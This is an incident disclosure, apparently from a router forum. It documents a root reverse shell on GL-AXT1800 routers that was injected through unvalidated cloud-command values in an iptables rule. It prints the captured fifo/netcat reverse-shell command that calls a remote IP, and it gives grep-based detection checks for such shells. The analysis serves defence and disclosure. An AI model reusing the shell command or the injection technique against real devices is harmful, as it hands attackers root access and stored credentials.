# The remote shell on GL-AXT1800 routers

First posted in the GL.iNet forum on 21 November 2026 ([post 34](https://forum.gl-inet.com/t/quickly-check-if-your-router-is-under-attack/73070/34)).
Findings R-1 to R-9 in [findings.md](findings.md). Times are UTC.

## What was running (read at 15:25 UTC on November 21)

```
sh -c iptables -t nat -A SDWAN_IP_MAPPING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1;(while true;do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 42499 >/tmp/f;sleep 3;done) >/dev/null 2>&1 &
/bin/sh -i
nc 170.39.226.219 42499
```

All three ran as root, and `netstat` showed the connection to 170.39.226.219:42499 as ESTABLISHED. That is an interactive root shell handed to a remote host.

## The three reports line up

| Report | Model / firmware | Remote end | Process start |
|---|---|---|---|
| forum post 10 | AXT1800 4.8.3 | 170.39.226.219:43104 | not stated |
| forum post 22 | AXT1800 4.8.3 | 170.39.226.219:43149 | about 21:40 UTC, Nov 20 |
| ours | AXT1800 4.8.3 | 170.39.226.219:42499 | 21:40 UTC, Nov 20 |

Same address, a different port in each, and the same start time on the two where it was measured (ours is from the process start time in `/proc`).

## How it got in

The reverse shell sits where an IP address belongs in an `iptables` command, and that command comes from the GoodCloud client on the router. The client (package `gl-sdk4-cloud`, as shipped in 4.8.3) has a handler for one of the AstroWarp / SD-WAN cloud commands. It builds `iptables -t nat -A SDWAN_IP_MAPPING -d <address> -j DNAT --to-destination <address>` from two values in the cloud message and passes the line to the shell, with no validation or quoting of either value. we read this in the client's code taken from this router. That client module is the only place on the router that builds this rule.

So this came down the cloud management channel as a crafted address. Two things follow:

- AstroWarp is not in use on this router (`mptun.global.enable='0'`, no AstroWarp tunnel running). The handler does not check that, so having the feature off did not help.
- The same handler is also in 4.8.4 (a build dated November 11, 2026). we compared the two and they are identical.

## Timeline on our router (UTC, November 20)

- 20:47:14: something was created, removed or renamed in `/etc`. we can't tell what.
- 21:40:24: the shell started.
- 21:54:38: last data received from the remote end, going by the timestamp on the shell's FIFO.
- 22:15:18: `/etc/mp_ip_mapping_info` was written as an empty file. That is the state file the same handler rewrites each time it runs.
- The shell stayed connected until we killed it at 15:42 UTC on November 21.

## It is not the indicator GL published

There was no `crond -i /tmp/.log` process on this router. `ps | grep tmp` does list the shell, on ours as a `cat /tmp/f` line, but only because its FIFO happens to be in `/tmp`, and the instructions say anything other than `crond -i /tmp/.log` means "healthy and secure".

## What it left behind

Nothing that we can find on disk. Apart from the entries in the timeline, the only things changed in the router's writable storage on November 19–21 are the web UI's error log and what we changed myself when we shut it down: no startup script, crontab, SSH key file or password file. we checked inode change times as well as modification times. Forum post 22 reports the process gone after a reboot.

Two cautions. A root shell can do damage that leaves no file, starting with reading every key and password on the router. And a router that has been rebooted or upgraded since November 20 can pass every process check even if it was hit.

## A check that catches this one (over SSH on the router)

```
ps w | grep -E 'crond -i|mkfifo|nc [0-9]|sh -i' | grep -v grep
```

```
netstat -nt | grep '170.39.226.'
```

```
ls -la /tmp/f
```

Lines like the ones at the top are a hit; so is any output from the second command. The third matters if the shell has already been killed: `/tmp/f` is the shell's named pipe (the line starts with `p`), and on ours it is still there after we killed the processes. It only goes away at a reboot. No output from all three only means it is not running and has not run since the last boot.

## If you get a hit

Save the output and the time, then kill the processes or reboot (killing them ended it on ours). After that, treat every secret stored on that router as exposed: VPN keys and configs, Wi-Fi passwords, the admin password hash, anything else it holds.


## Also affected by the same code

The same unchecked code is in the GoodCloud client of GL-MT3000 firmware 4.11.0 (built
2026-09-24). No remote shell has been reported on that model so far.
